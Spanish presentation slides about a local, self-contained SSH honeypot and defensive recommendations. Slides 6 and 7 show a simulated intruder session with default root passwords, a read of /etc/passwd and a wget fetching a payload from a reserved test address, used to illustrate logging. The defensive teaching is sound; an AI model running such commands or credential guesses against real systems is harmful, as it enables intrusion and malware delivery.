# Diapositivas — Honeypot casero (6 a 10)

Cinco diapositivas para los últimos 6:30 de la exposición. Lo que se dice está en
[`GUION.md`](GUION.md); las diapositivas 1 a 5 (problema y analizador de phishing) están en
el repositorio `analizador-phishing`.

---

## 6 · Herramienta 2 — el honeypot

- Trampa con apariencia de SSH: banner, `login:`, `Password:`
- Rechaza **dos** credenciales y acepta la tercera: para poder **observar**
- Es una emulación en texto, no un servidor SSH real
- Todo queda registrado con hora exacta

```
Intento 1 · root/123456 → Permission denied
Intento 2 · root/admin → Permission denied
Intento 3 · root/toor → Welcome
$ cat /etc/passwd
$ wget http://198.51.100.7/payload.sh
```

---

## 7 · Lo que dice el registro

```
Sesión 1 · ssh · 127.0.0.1:47956 · 14 eventos
  Credenciales: root/123456 (denied) · root/admin (denied) · root/toor (accepted)
  Órdenes (7): uname -a; whoami; id; ls; cat /etc/passwd; wget …; exit
  Descargas: http://198.51.100.7/payload.sh
```

- **Qué credenciales** usa → qué cambiar y qué MFA activar
- **Qué busca** → leer `/etc/passwd` busca accesos; el `wget` es el daño
- **Cuándo** → correlación con el resto de registros

---

## 8 · Defensa: tres recomendaciones

1. **No confíe en el dominio, confíe en el contexto** — marca + palabras de gancho + sin
   HTTPS = revisión, aunque «se vea» como el banco
2. **Consultas parametrizadas y MFA** — del lado del servidor y del lado del usuario
3. **Reglas de salida para el correo** — marcar acortadores y remitentes que no cuadran

---

## 9 · Legal, límites y trabajo futuro

- Todo en `127.0.0.1`; el programa **se niega** a escuchar en otra dirección
- El «atacante» es un script del propio proyecto: bucle cerrado, cero terceros
- Credenciales sintéticas; la dirección de descarga es del rango reservado de pruebas
- Trabajo futuro: base de datos, avisos por IP nueva, panel web de sesiones

---

## 10 · Cierre

**Detectar antes. Observar después. Decidir con una persona, no con una regla.**

- Código, guion y guía de ensayo en los dos repositorios
- Gracias · ¿Preguntas?
